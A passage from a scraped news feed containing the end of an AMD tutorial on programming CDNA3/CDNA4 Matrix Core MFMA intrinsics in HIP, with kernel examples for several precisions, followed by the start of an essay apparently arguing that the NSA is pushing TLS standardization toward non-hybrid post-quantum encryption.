      &lt;item&gt;&lt;code&gt;M * N / wavefront_size = 32 * 32 / 64 = 16&lt;/code&gt;entries of the matrix&lt;code&gt;C&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The operands are distributed according to the scheme below. The matrix elements highlighted in light red are those stored by the thread with index &lt;code&gt;0&lt;/code&gt; within the wavefront.&lt;/p&gt;
    &lt;p&gt;Figure 5: Data layout for `__builtin_amdgcn_mfma_f32_32x32x2f32`. The operands are stored in row-major order.&lt;/p&gt;
    &lt;p&gt;The code example below demonstrates how this operation can be implemented as a HIP kernel:&lt;/p&gt;
    &lt;code&gt;#include &amp;lt;hip/hip_runtime.h&amp;gt;

using fp32x16_t = __attribute__((vector_size(16 * sizeof(float)))) float;

__global__ void
mfma_fp32_32x32x2_fp32(const float* A, const float* B, float* C) {
    float a_reg;
    float b_reg;
    fp32x16_t c_reg {};

    const float* ldg_a_ptr = A + threadIdx.x / 32 + 2 * (threadIdx.x % 32);
    const float* ldg_b_ptr = B + threadIdx.x % 32 + (threadIdx.x / 32) * 32;

    a_reg = *ldg_a_ptr;
    b_reg = *ldg_b_ptr;

    c_reg = __builtin_amdgcn_mfma_f32_32x32x2f32(a_reg, b_reg, c_reg, 0, 0, 0);

    for (int i = 0; i &amp;lt; 4; i++) {
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + i * 32 * 8]          = c_reg[i * 4];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 1 + i * 32 * 8] = c_reg[i * 4 + 1];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 2 + i * 32 * 8] = c_reg[i * 4 + 2];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 3 + i * 32 * 8] = c_reg[i * 4 + 3];
    }
}
&lt;/code&gt;
    &lt;p&gt;The GPU kernel can then be invoked on the host using a single wavefront:&lt;/p&gt;
    &lt;code&gt;mfma_fp32_32x32x2_fp32&amp;lt;&amp;lt;&amp;lt;1, 64&amp;gt;&amp;gt;&amp;gt;(A_device, B_device, C_device);
&lt;/code&gt;
    &lt;p&gt;Please note that we use the vector data type &lt;code&gt;fp32x16_t&lt;/code&gt; to store the entries of the matrix &lt;code&gt;C&lt;/code&gt; in registers. Additionally, we zero-initialize &lt;code&gt;c&lt;/code&gt;, since we compute &lt;code&gt;C = A * B&lt;/code&gt; without accumulation.&lt;/p&gt;
    &lt;head rend="h3"&gt;5.2. __builtin_amdgcn_mfma_f32_16x16x16f16&lt;/head&gt;
    &lt;p&gt;This example demonstrates how to multiply matrix &lt;code&gt;A&lt;/code&gt; of size &lt;code&gt;16x16&lt;/code&gt; with matrix &lt;code&gt;B&lt;/code&gt; of size &lt;code&gt;16x16&lt;/code&gt; using single wavefront (64 threads) and single MFMA instruction. The output matrix &lt;code&gt;C&lt;/code&gt; has shape &lt;code&gt;16x16&lt;/code&gt;. The input matrices are stored in FP16 and the output matrix stored in FP32. In this case, each thread stores &lt;code&gt;4&lt;/code&gt; entries of the matrix &lt;code&gt;A&lt;/code&gt;, &lt;code&gt;4&lt;/code&gt; entries of the matrix &lt;code&gt;B&lt;/code&gt; and &lt;code&gt;4&lt;/code&gt; entries of the matrix &lt;code&gt;C&lt;/code&gt;. The data layout for this instruction is shown below. For illustrative purposes, the elements stored by the first thread within the wavefront are highlighted in red.&lt;/p&gt;
    &lt;p&gt;Figure 6: Data layout for __builtin_amdgcn_mfma_f32_16x16x16f16. The operands are stored in row-major order.&lt;/p&gt;
    &lt;p&gt;Corresponding HIP kernel is implemented below:&lt;/p&gt;
    &lt;code&gt;#include &amp;lt;hip/hip_runtime.h&amp;gt;
#include &amp;lt;hip/hip_fp16.h&amp;gt;

using fp16_t = _Float16;
using fp16x4_t = __attribute__((vector_size(4 * sizeof(fp16_t)))) fp16_t;
using fp32x4_t = __attribute__((vector_size(4 * sizeof(float)))) float;

__global__ void
mfma_fp32_16x16x16_fp16(const fp16_t* A, const fp16_t* B, float* C) {

    fp16x4_t a_reg;
    fp16x4_t b_reg;
    fp32x4_t c_reg {};

    a_reg = *reinterpret_cast&amp;lt;const fp16x4_t*&amp;gt;(A + 4 * (threadIdx.x / 16) + 16 * (threadIdx.x % 16));

    for (int i = 0; i &amp;lt; 4; i++) {
        b_reg[i] = *(B + i * 16 + threadIdx.x % 16 + (threadIdx.x / 16) * 64);
    }

    c_reg = __builtin_amdgcn_mfma_f32_16x16x16f16(a_reg, b_reg, c_reg, 0, 0, 0);

    for (int i = 0; i &amp;lt; 4; i++) {
        *(C + i * 16 + threadIdx.x % 16 + (threadIdx.x / 16) * 64) = c_reg[i];
    }
}
&lt;/code&gt;
    &lt;p&gt;Please note that both &lt;code&gt;__half&lt;/code&gt; and &lt;code&gt;_Float16&lt;/code&gt; types can be used in device code. However, the host supports only &lt;code&gt;_Float16&lt;/code&gt; type for arithmetic operations. As in the previous example, we use vector data types to store the matrix elements in registers.&lt;/p&gt;
    &lt;head rend="h3"&gt;5.3. __builtin_amdgcn_mfma_f32_32x32x16_fp8_fp8&lt;/head&gt;
    &lt;p&gt;In this example we will multiply matrix &lt;code&gt;A&lt;/code&gt; of size &lt;code&gt;32x16&lt;/code&gt; with matrix &lt;code&gt;B&lt;/code&gt; of size &lt;code&gt;16x32&lt;/code&gt; using single wavefront (64 threads) and single MFMA instruction. The output matrix &lt;code&gt;C&lt;/code&gt; has shape &lt;code&gt;32x32&lt;/code&gt;. The input matrices are stored in FP8 and the output matrix is stored in FP32. In this scenario, each thread stores &lt;code&gt;8&lt;/code&gt; elements of the matrix &lt;code&gt;A&lt;/code&gt;, &lt;code&gt;8&lt;/code&gt; elements of the matrix &lt;code&gt;B&lt;/code&gt; and &lt;code&gt;16&lt;/code&gt; elements of the matrix &lt;code&gt;C&lt;/code&gt;. The operands are distributed according to the scheme below. For illustrative purposes, the elements stored by the first thread within the wavefront are highlighted in red.&lt;/p&gt;
    &lt;p&gt;Figure 7: Data layout for __builtin_amdgcn_mfma_f32_32x32x16_fp8_fp8. The operands are stored in row-major order.&lt;/p&gt;
    &lt;p&gt;The code example below implements this operation as a HIP kernel:&lt;/p&gt;
    &lt;code&gt;#include &amp;lt;hip/hip_runtime.h&amp;gt;
#include &amp;lt;hip/hip_fp8.h&amp;gt;

using fp8_t = __hip_fp8_storage_t;
using fp8x8_t = __attribute__((vector_size(8 * sizeof(fp8_t)))) fp8_t;
using fp32x16_t = __attribute__((vector_size(16 * sizeof(float)))) float;

__global__ void
mfma_fp32_32x32x16_fp8_fp8(const fp8_t* A, const fp8_t* B, float* C) {
    fp8x8_t a_reg;
    fp8x8_t b_reg;
    fp32x16_t c_reg {};

    a_reg = *reinterpret_cast&amp;lt;const fp8x8_t*&amp;gt;(A + (threadIdx.x / 32) * 8 + (threadIdx.x % 32) * 16);

    for (int i = 0; i &amp;lt; 8; i++) {
        b_reg[i] = *(B + i * 32 + threadIdx.x % 32 + (threadIdx.x / 32) * 8 * 32);
    }

    c_reg = __builtin_amdgcn_mfma_f32_32x32x16_fp8_fp8((long)a_reg, (long)b_reg, c_reg, 0, 0, 0);

    for (int i = 0; i &amp;lt; 4; i++) {
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + i * 32 * 8]          = c_reg[i * 4];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 1 + i * 32 * 8] = c_reg[i * 4 + 1];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 2 + i * 32 * 8] = c_reg[i * 4 + 2];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 3 + i * 32 * 8] = c_reg[i * 4 + 3];
    }
}
&lt;/code&gt;
    &lt;p&gt;To define FP8, we use &lt;code&gt;__hip_fp8_storage_t&lt;/code&gt; type from &lt;code&gt;hip_fp8.h&lt;/code&gt;. Note that the intrinsic function expects its first two operands to be of type &lt;code&gt;long&lt;/code&gt;. To compile the code, the operands &lt;code&gt;a&lt;/code&gt; and &lt;code&gt;b&lt;/code&gt; are, therefore, converted to &lt;code&gt;long&lt;/code&gt;.&lt;/p&gt;
    &lt;head rend="h3"&gt;5.4. __builtin_amdgcn_mfma_scale_f32_32x32x64_f8f8&lt;/head&gt;
    &lt;quote&gt;
      &lt;p&gt;Important note: the MFMA instruction discussed in this example is supported only on AMD CDNA™4 GPUs (gfx950). Please make sure to install AMD ROCm™ version 7.0 or later.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;The AMD CDNA™4 architecture introduces a new family of MFMA instructions with block exponent scaling. The syntax of these instructions differs from the classic MFMA compiler intrinsics:&lt;/p&gt;
    &lt;p&gt;
      &lt;code&gt;d_reg = __builtin_amdgcn_mfma_scale_f32_MxNxK_f8f6f4(a_reg, b_reg, c_reg, Atype, Btype, OPSEL_A, scale_a, OPSEL_B, scale_b)&lt;/code&gt;
    &lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;&lt;code&gt;MxNxK&lt;/code&gt;specifies shapes of the matrices&lt;code&gt;A&lt;/code&gt;,&lt;code&gt;B&lt;/code&gt;,&lt;code&gt;C&lt;/code&gt;,&lt;code&gt;D&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;a_reg&lt;/code&gt;is a vector containing elements of the matrix&lt;code&gt;A&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;b_reg&lt;/code&gt;is a vector containing elements of the matrix&lt;code&gt;B&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;c_reg&lt;/code&gt;is a vector containing elements of the matrix&lt;code&gt;C&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;d_reg&lt;/code&gt;is a vector containing elements of the matrix&lt;code&gt;D&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;Atype&lt;/code&gt;is an integer that specifies the data type of the matrix&lt;code&gt;A&lt;/code&gt;. The following values are possible:&lt;code&gt;0 = E4M3 (fp8), 1 = E5M2(bf8), 2 = E2M3(fp6), 3 = E3M2(bf6), 4 = E2M1(fp4)&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;Btype&lt;/code&gt;is an integer that specifies the data type of the matrix&lt;code&gt;B&lt;/code&gt;. The following values are possible:&lt;code&gt;0 = E4M3 (fp8), 1 = E5M2(bf8), 2 = E2M3(fp6), 3 = E3M2(bf6), 4 = E2M1(fp4)&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;OPSEL_A&lt;/code&gt;,&lt;code&gt;OPSEL_B&lt;/code&gt;are OPSEL codes. These arguments are not relevant for the discussion and therefore will be set to&lt;code&gt;0&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;scale_a&lt;/code&gt;,&lt;code&gt;scale_b&lt;/code&gt;are scalars / vectors containing scale factors of type&lt;code&gt;E8M0&lt;/code&gt;.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;As an example, let’s take a closer look at the instruction &lt;code&gt;__builtin_amdgcn_mfma_scale_f32_32x32x64_f8f6f4&lt;/code&gt;. The inputs to this instruction are&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Matrix &lt;code&gt;A&lt;/code&gt;of size&lt;code&gt;32x64&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Matrix &lt;code&gt;Ax&lt;/code&gt;of size&lt;code&gt;32x2&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Matrix &lt;code&gt;B&lt;/code&gt;of size&lt;code&gt;64x32&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Matrix &lt;code&gt;Bx&lt;/code&gt;of size&lt;code&gt;2x32&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The output matrix &lt;code&gt;C&lt;/code&gt; has shape &lt;code&gt;32x32&lt;/code&gt;. Specifically, this instruction performs the following operation using single wavefront (64 threads):&lt;/p&gt;
    &lt;p&gt;Figure 8: Block-scaled matrix multiplication via __builtin_amdgcn_mfma_scale_f32_32x32x64_f8f6f4.&lt;/p&gt;
    &lt;p&gt;During dot product operations, the scales &lt;code&gt;Ax&lt;/code&gt;, &lt;code&gt;Bx&lt;/code&gt; are applied after the normal dot product and prior to output/accumulation.&lt;/p&gt;
    &lt;p&gt;In this example, we will multiply two FP8 matrices using the &lt;code&gt;__builtin_amdgcn_mfma_scale_f32_32x32x64_f8f6f4&lt;/code&gt; intrinsic function. The input matrices &lt;code&gt;A&lt;/code&gt;, &lt;code&gt;B&lt;/code&gt; are stored in FP8 format, while the output matrix is stored in FP32. The scale matrices &lt;code&gt;Ax&lt;/code&gt;, &lt;code&gt;Bx&lt;/code&gt; contain elements of type &lt;code&gt;E8M0&lt;/code&gt;. Each thread stores &lt;code&gt;32&lt;/code&gt; entries from the matrix &lt;code&gt;A&lt;/code&gt;, &lt;code&gt;1&lt;/code&gt; entry from the matrix &lt;code&gt;Ax&lt;/code&gt;, &lt;code&gt;32&lt;/code&gt; entries from the matrix &lt;code&gt;B&lt;/code&gt;, &lt;code&gt;1&lt;/code&gt; entry from the matrix &lt;code&gt;Bx&lt;/code&gt; and &lt;code&gt;16&lt;/code&gt; entries from the matrix &lt;code&gt;C&lt;/code&gt;. The operands are distributed according to the scheme below. Please note that this scheme is valid only if both input matrices &lt;code&gt;A&lt;/code&gt; and &lt;code&gt;B&lt;/code&gt; have FP8 type. For illustrative purposes, the matrix elements stored by the thread with &lt;code&gt;threadIdx.x = 0&lt;/code&gt; are highlighted in light red, while the elements stored by the thread with &lt;code&gt;threadIdx.x = 32&lt;/code&gt; within the wavefront are highlighted in light green.&lt;/p&gt;
    &lt;p&gt;Figure 9: Data layout for __builtin_amdgcn_mfma_scale_f32_32x32x64_f8f6f4 with FP8 input matrices. The operands are stored in row-major order.&lt;/p&gt;
    &lt;p&gt;The following code example shows how this operation can be implemented as a HIP kernel:&lt;/p&gt;
    &lt;code&gt;#include &amp;lt;hip/hip_runtime.h&amp;gt;
#include &amp;lt;hip/hip_ext_ocp.h&amp;gt;

using fp8_t = __amd_fp8_storage_t;
using fp8x32_t = __attribute__((vector_size(32 * sizeof(fp8_t)))) fp8_t;
using fp32x16_t = __attribute__((vector_size(16 * sizeof(float)))) float;

__global__ void
mfma_fp32_32x32x64_fp8_fp8(const fp8_t* A, const fp8_t* B, float* C) {
    fp8x32_t a_reg;
    fp8x32_t b_reg;
    fp32x16_t c_reg {};

    const fp8_t* ldg_a = A + (threadIdx.x % 32) * 64 + (threadIdx.x / 32) * 16;
    for (int i=0; i &amp;lt; 2; i++) {
        for (int j=0; j &amp;lt; 16; j++) {
            a_reg[i*16 + j] = *(ldg_a + i * 32 + j);
        }
    }

    const fp8_t* ldg_b = B + threadIdx.x % 32 + 32 * 16 * (threadIdx.x / 32);

    for (int i=0; i&amp;lt;2; i++) {
        for (int j=0; j &amp;lt; 16; j++) {
            b_reg[i*16 + j] = *(ldg_b + 32 * j + i * 32 * 32);
        }
    }

    uint8_t scale_a = 127;
    uint8_t scale_b = 127;

    c_reg = __builtin_amdgcn_mfma_scale_f32_32x32x64_f8f6f4(a_reg, b_reg, c_reg, 0, 0, 0, scale_a, 0, scale_b);

    for (int i = 0; i &amp;lt; 4; i++) {
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + i * 32 * 8]          = c_reg[i * 4];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 1 + i * 32 * 8] = c_reg[i * 4 + 1];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 2 + i * 32 * 8] = c_reg[i * 4 + 2];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 3 + i * 32 * 8] = c_reg[i * 4 + 3];
    }
}
&lt;/code&gt;
    &lt;p&gt;Please note that in this example we use &lt;code&gt;__amd_fp8_storage_t&lt;/code&gt; type defined in &lt;code&gt;hip_ext_ocp.h&lt;/code&gt; to represent FP8. This library provides extensions APIs for low-precision and micro-scaling formats, and compared to &lt;code&gt;hip_fp8.h&lt;/code&gt;, exposes a wider capability set. &lt;code&gt;gfx950&lt;/code&gt; provides hardware acceleration for these APIs. Most of the APIs are 1 to 1 mapping of hardware instruction. Additionally, we use &lt;code&gt;uint8_t&lt;/code&gt; type to represent &lt;code&gt;E8M0&lt;/code&gt; scale factors. Since &lt;code&gt;scale_a&lt;/code&gt; and &lt;code&gt;scale_b&lt;/code&gt; encode exponent values, the corresponding actual scale factors are &lt;code&gt;2^(scale_a - 127)&lt;/code&gt; and &lt;code&gt;2^(scale_b - 127)&lt;/code&gt;. If &lt;code&gt;scale_a = scale_b = 127&lt;/code&gt;, the actual scale factors are equal to &lt;code&gt;1&lt;/code&gt; and no scaling is applied.&lt;/p&gt;
    &lt;head rend="h3"&gt;5.5. __builtin_amdgcn_mfma_scale_f32_32x32x64_f4f4&lt;/head&gt;
    &lt;p&gt;In our last example, we demonstrate how to multiply two FP4 matrices using the &lt;code&gt;__builtin_amdgcn_mfma_scale_f32_32x32x64_f8f6f4&lt;/code&gt; intrinsic function. As in the previous example, each thread stores &lt;code&gt;32&lt;/code&gt; entries from the matrix &lt;code&gt;A&lt;/code&gt;, &lt;code&gt;1&lt;/code&gt; entry from the matrix &lt;code&gt;Ax&lt;/code&gt;, &lt;code&gt;32&lt;/code&gt; entries from the matrix &lt;code&gt;B&lt;/code&gt;, &lt;code&gt;1&lt;/code&gt; entry from the matrix &lt;code&gt;Bx&lt;/code&gt; and &lt;code&gt;16&lt;/code&gt; entries from the matrix &lt;code&gt;C&lt;/code&gt;. The data layout for the output matrix remains the same as in the FP8 case. However, the data layout for the input matrices is different and depicted below. For illustrative purposes, the matrix elements stored by the thread with &lt;code&gt;threadIdx.x = 0&lt;/code&gt; are highlighted in light red, while the elements stored by the thread with &lt;code&gt;threadIdx.x = 32&lt;/code&gt; within the wavefront are highlighted in light green.&lt;/p&gt;
    &lt;p&gt;Figure 10: Data layout for __builtin_amdgcn_mfma_scale_f32_32x32x64_f8f6f4 with FP4 input matrices. The operands are stored in row-major order.&lt;/p&gt;
    &lt;p&gt;The code snippet below demonstrates how to implement this operation as a HIP kernel:&lt;/p&gt;
    &lt;code&gt;#include &amp;lt;hip/hip_runtime.h&amp;gt;
#include &amp;lt;hip/hip_ext_ocp.h&amp;gt;

using fp4x2_t = __amd_fp4x2_storage_t;
using fp4x64_t  = fp4x2_t __attribute__((ext_vector_type(32)));
using fp32x16_t = __attribute__((vector_size(16 * sizeof(float)))) float;

__global__ void
mfma_fp32_32x32x64_fp4_fp4(const fp4x2_t* A, const fp4x2_t* B, float* C) {

    fp4x64_t a_reg {};
    fp4x64_t b_reg {};
    fp32x16_t c_reg {};

    const fp4x2_t* ldg_a = A + (threadIdx.x % 32) * 32 + (threadIdx.x / 32) * 16;

    for (int i = 0; i &amp;lt; 16; i++) {
        a_reg[i] = *(ldg_a + i);
    }

    const fp4x2_t* ldg_b = B + (threadIdx.x % 32) / 2 + 16 * 32 * (threadIdx.x / 32);
    int b_extract_idx = threadIdx.x % 2;

    for (int i = 0; i &amp;lt; 16; i++) {
        uint8_t tmp0 = __amd_extract_fp4(*(ldg_b + 16 * 2 * i), b_extract_idx);
        uint8_t tmp1 = __amd_extract_fp4(*(ldg_b + 16 * (2 * i + 1)), b_extract_idx);
        b_reg[i] = __amd_create_fp4x2(tmp0, tmp1);
    }

    uint8_t scale_a = 127;
    uint8_t scale_b = 127;

    c_reg = __builtin_amdgcn_mfma_scale_f32_32x32x64_f8f6f4(a_reg, b_reg, c_reg, 4, 4, 0, scale_a, 0, scale_b);

    for (int i = 0; i &amp;lt; 4; i++) {
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + i * 32 * 8]          = c_reg[i * 4];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 1 + i * 32 * 8] = c_reg[i * 4 + 1];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 2 + i * 32 * 8] = c_reg[i * 4 + 2];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 3 + i * 32 * 8] = c_reg[i * 4 + 3];
    }
}
&lt;/code&gt;
    &lt;p&gt;Since memory addressing is not allowed at a granularity smaller than 8 bits, we use &lt;code&gt;__amd_fp4x2_storage_t&lt;/code&gt; (an alias for &lt;code&gt;uint8_t&lt;/code&gt;) to store the input matrices and enable pointer operations. Note that the FP4 elements that need to be loaded from the matrix &lt;code&gt;B&lt;/code&gt; are not contiguous in memory. To extract a single FP4 element, we use the &lt;code&gt;__amd_extract_fp4&lt;/code&gt; function provided in &lt;code&gt;hip_ext_ocp.h&lt;/code&gt;. This function returns one FP4 element (of type &lt;code&gt;uint8_t&lt;/code&gt;) from a fp4x2 vector, based on the index passed as the second argument:&lt;/p&gt;
    &lt;code&gt;uint8_t __amd_extract_fp4(const __amd_fp4x2_storage_t x, const size_t index) {
    if (index == 0) return (x &amp;amp; 0xFu);
    return (x &amp;gt;&amp;gt; 4);
}
&lt;/code&gt;
    &lt;p&gt;Two FP4 values are then combined into &lt;code&gt;__amd_fp4x2_storage_t&lt;/code&gt; using &lt;code&gt;__amd_create_fp4x2&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;__amd_fp4x2_storage_t __amd_create_fp4x2(const uint8_t x, const uint8_t y) {
    __amd_fp4x2_storage_t ret = 0;
    ret = x | (y &amp;lt;&amp;lt; 4);
    return ret;
}
&lt;/code&gt;
    &lt;p&gt;The compiler intrinsic function &lt;code&gt;__builtin_amdgcn_mfma_scale_f32_32x32x64_f8f6f4&lt;/code&gt; requires its first two arguments to be 256 bits wide. Since 32 FP4 elements occupy only 128 bits, we define &lt;code&gt;fp4x64_t&lt;/code&gt;, which is 256 bits wide. In this type, 128 bits contain data, while the remaining 128 bits are zero. This allows us to pass &lt;code&gt;a_reg&lt;/code&gt; and &lt;code&gt;b_reg&lt;/code&gt; to the intrinsic function and compile the code successfully.&lt;/p&gt;
    &lt;head rend="h2"&gt;Summary&lt;/head&gt;
    &lt;p&gt;In this article, we introduced Matrix Core instructions available on the AMD CDNA™3 and CDNA™4 architectures. We covered floating-point formats in detail, including modern low-precision element data types such as FP8, FP6, FP4, and the scale data type E8M0. We further explained how the floating-point types are represented as binary sequences and demonstrated, with concrete examples, how to convert their binary representations into real values. Next, we listed Matrix Core instructions supported by the modern CDNA™ architectures and discussed how to calculate the theoretical peak performance of Matrix Cores for specific MFMA instructions. To make the discussion more practical, we reviewed the compiler intrinsic functions that allow users to program Matrix Cores inside HIP kernels. Finally, we examined a subset of MFMA instructions in detail, providing code examples and illustrations to explain data layout and demonstrate how to implement simple mixed-precision MFMA operations in HIP. For additional information on Matrix Cores and low-precision data types, please refer to the following resources:&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45476821</guid><pubDate>Sat, 04 Oct 2025 21:22:11 +0000</pubDate></item><item><title>OpenAI's hunger for computing power</title><link>https://www.wsj.com/tech/ai/openai-sam-altman-asia-middle-east-7b660809</link><description></description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45477192</guid><pubDate>Sat, 04 Oct 2025 22:14:29 +0000</pubDate></item><item><title>NSA and IETF: Can an attacker purchase standardization of weakened cryptography?</title><link>https://blog.cr.yp.to/20251004-weakened.html</link><description>&lt;doc fingerprint="3e9999123e0289dd"&gt;
  &lt;main&gt;
    &lt;p&gt;It's normal for post-quantum cryptography to be rolled out as an extra layer of security on top of traditional pre-quantum cryptography, rather than as a replacement.&lt;/p&gt;
    &lt;p&gt;For example, Google's CECPQ1 experiment was double encryption with traditional pre-quantum ECC (specifically X25519) and post-quantum NewHope1024. CECPQ2, a joint experiment between Google and Cloudflare, was ECC+NTRUHRSS701. CECPQ2b was ECC+SIKEp434. Ten SSH implementations support ECC+sntrup761. Today's usage of post-quantum cryptography by browsers is approaching half of the connections seen by Cloudflare, where 95% of that is ECC+MLKEM768 and 5% is ECC+Kyber768.&lt;/p&gt;
    &lt;p&gt;If post-quantum cryptography is designed to be super-strong, so strong that it even survives future quantum computers, then why are we keeping the ECC layer? Same reason that you wear your seatbelt: in the real world, cars sometimes crash, and seatbelts reduce the damage.&lt;/p&gt;
    &lt;p&gt;Google already explained this back in 2016: "The post-quantum algorithm might turn out to be breakable even with today's computers, in which case the elliptic-curve algorithm will still provide the best security that today's technology can offer." We've seen many breaks of post-quantum proposals since then, including the sudden public collapse of SIKE three years after CECPQ2b applied SIKE to tens of millions of user connections. The only reason that this user data wasn't immediately exposed to attackers is that CECPQ2b encrypted data with SIKE and with ECC, rather than switching from ECC to just SIKE. As another example, the reference Kyber/ML-KEM software went through two rounds of security patches for KyberSlash at the end of 2023, and then had another security patch in mid-2024.&lt;/p&gt;
    &lt;p&gt;Deploying ECC+PQ rather than just PQ is an easy common-sense win. ECC software is practically everywhere anyway, and nobody has identified an application that can afford PQ without being able to afford ECC+PQ.&lt;/p&gt;
    &lt;p&gt;Typically people talk about deploying ECC+PQ as deploying "hybrids" rather than "non-hybrids", although you have to be careful with this terminology since the word "hybrid" also has other meanings in cryptography. It's more descriptive to talk about "double encryption" and "double signatures" rather than "single encryption" and "single signatures".&lt;/p&gt;
    &lt;p&gt;The problem in a nutshell. Surveillance agency NSA and its partner GCHQ are trying to have standards-development organizations endorse weakening ECC+PQ down to just PQ.&lt;/p&gt;
    &lt;p&gt;Part of this is that NSA and GCHQ have been endlessly repeating arguments that this weakening is a good thing (in much the same way that NSA advertised Dual EC as providing "increased assurance"). I have a previous blog post showing that those arguments collapse upon examination. But that's not today's topic. In today's blog post I'm instead looking at how easy it is for NSA to simply spend money to corrupt the standardization process.&lt;/p&gt;
    &lt;p&gt;Two TLS encryption drafts. For concreteness, I'll focus on what's happening in a particular standards-development organization called the Internet Engineering Task Force (IETF). Within that, I'll focus on current proposals within an IETF "working group" (WG) that sets standards for Transport Layer Security (TLS), the security layer inside HTTPS and inside various other protocols. I'll look specifically at how the TLS WG handled two drafts specifying post-quantum encryption mechanisms for TLS:&lt;/p&gt;
    &lt;p&gt;Hybrid (double encryption): "Post-quantum hybrid ECDHE-MLKEM Key Agreement for TLSv1.3". This draft specifies ECC+PQ in TLS, specifically usage in TLS of "X25519MLKEM768, SecP256r1MLKEM768, and SecP384r1MLKEM1024". The first of those is also what I mentioned above as 95% of current post-quantum connections to Cloudflare.&lt;/p&gt;
    &lt;p&gt;Non-hybrid (single encryption): "ML-KEM Post-Quantum Key Agreement for TLS 1.3". This draft specifies usage in TLS of "ML-KEM-512, ML-KEM-768, and ML-KEM-1024" without seatbelts.&lt;/p&gt;
    &lt;p&gt;The non-hybrid draft was first posted in March 2024. Of course someone asked "what the motivation is for being 'fully post-quantum' rather than hybrid". The draft author responded: "FIPS / CNSA 2.0 compliance guidelines ... currently are a big 'maybe' at best for 'hybrid solutions', and the timetables for compliant browsers, servers, and services are to exclusively use FIPS 203 at level V (ML-KEM-1024) by 2033. I figure there will be demand for pure ML-KEM key agreement, not hybrid (with no questions that come along with it of whether it's actually allowed or not)."&lt;/p&gt;
    &lt;p&gt;As context, the massive U.S. military budget now publicly requires cryptographic "components" to have NSA approval. "CNSA 2.0" refers to a public NSA document "Commercial National Security Algorithm Suite 2.0". The document says up front that its requirements apply to "all NSS use of public cryptographic algorithms (as opposed to algorithms NSA developed), including those on all unclassified and classified NSS". The legal definition of "national security system" (NSS) covers practically all military information systems, except for "routine administrative and business applications" such as "payroll".&lt;/p&gt;
    &lt;p&gt;In June 2024, NSA's William Layton wrote that "we do not anticipate supporting hybrid in NSS".&lt;/p&gt;
    &lt;p&gt;In December 2024, a Cisco employee wrote the following: "There are people whose cryptographic expertise I cannot doubt who say that pure ML-KEM is the right trade-off for them, and more importantly for my employer, that's what they're willing to buy. Hence, Cisco will implement it; I am essentially just asking for code points." Certainly "willing to buy" is a statement about funding, evidently from a source large enough to dictate Cisco actions, evidently from a source asking for non-hybrids, evidently from "people whose cryptographic expertise I cannot doubt"; if that source isn't NSA, who is it?&lt;/p&gt;
    &lt;p&gt;(Side note: If you think the word "pure" in "pure ML-KEM" sounds good, remember that replacing CECPQ2's ECC+SIKE with "pure SIKE" would have been a disaster.)&lt;/p&gt;
    &lt;p&gt;In June 2025, NSA's Mike Jenkins posted the following: "As the CNSA 2.0 profiles should make clear, we are looking for products that support /standalone/ ML-DSA-87 and /standalone/ ML-KEM-1024. If there is one vendor that produces one product that complies, then that is the product that goes on the compliance list and is approved for use. Our interactions with vendors suggests that this won't be a problem in most cases." Evidently there are many companies happy to jump when NSA says jump.&lt;/p&gt;
    &lt;p&gt;Pretending to eat your own dog food. For software engineers, "dogfooding" (a term perhaps coined by Paul Maritz in the 1980s) refers to making regular use of the software that you're writing. This builds your confidence that the software works, and helps iron out problems.&lt;/p&gt;
    &lt;p&gt;But there's also a marketing version of the same concept, where you publicly say that you're using your own software as a way to build other people's confidence in the software. As in other types of marketing, what you're saying doesn't have to be true.&lt;/p&gt;
    &lt;p&gt;Once upon a time, NSA weakened the Data Encryption Standard to just 56 bits. In public, NSA claimed that it hadn't tampered with the standard, and that the "implausibility of public allegations is further demonstrated by the fact that NSA has endorsed the use of DES for the encryption of national security-related information, including selected classified information".&lt;/p&gt;
